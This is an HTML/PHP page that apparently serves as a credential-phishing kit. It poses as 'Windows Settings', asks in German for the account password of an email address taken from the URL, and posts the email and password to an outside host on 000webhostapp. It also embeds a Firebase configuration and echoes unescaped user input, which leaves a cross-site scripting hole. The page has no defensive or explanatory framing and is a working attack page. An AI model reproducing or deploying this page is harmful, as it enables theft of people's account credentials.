<html>
<head>
<link rel="shortcut icon" href="favi.jpg" type="image/gif"/>
<title>Windows Settings </title></head>
<body>

<br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="logo.png" width="280" height="100">


	<br>

	<form method="post" action="https://notte.000webhostapp.com/file/insert.php">

	<input  name="email" type="hidden" value="<?php echo $_GET['email']; ?>">
	

	

	<br><br>

	<font face="verdana" size="+3" color="#000000"> <?php echo $_GET['email']; ?> </font>

	<br><br>

	<font face="verdana" size="2" color="#ff0000">
	Geben Sie das Kontokennwort ein, um fortzufahren
	</font>

	<br><br>

	<input  name="pass" type="password" style="width:300px; height:45px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #0080FF; padding: 13px;" required="" placeholder="Passwort eingeben">	



	<br><br>

	<input type="submit" value="Continue >>" style="width:300px; height:60px; background-color: #0080FF; border: solid 3px #0080FF; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 5px 5px 5px #888; -webkit-box-shadow: 5px 5px 5px #888; box-shadow: 5px 5px 5px #888;">

	<br>

<script src="https://www.gstatic.com/firebasejs/7.22.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/7.22.1/firebase-analytics.js"></script>
<script>
  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyB1gKtEkj-WYTjOGxDamv9WJDiciJqeLMs",
    authDomain: "web-portal-5dc35.firebaseapp.com",
    databaseURL: "https://web-portal-5dc35.firebaseio.com",
    projectId: "web-portal-5dc35",
    storageBucket: "web-portal-5dc35.appspot.com",
    messagingSenderId: "1081139989510",
    appId: "1:1081139989510:web:a9446c6af37e5f00318787",
    measurementId: "G-C447X6TRT8"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();
</style>
	</form>


	</div>

</td></tr>

</table>


</body>
</html>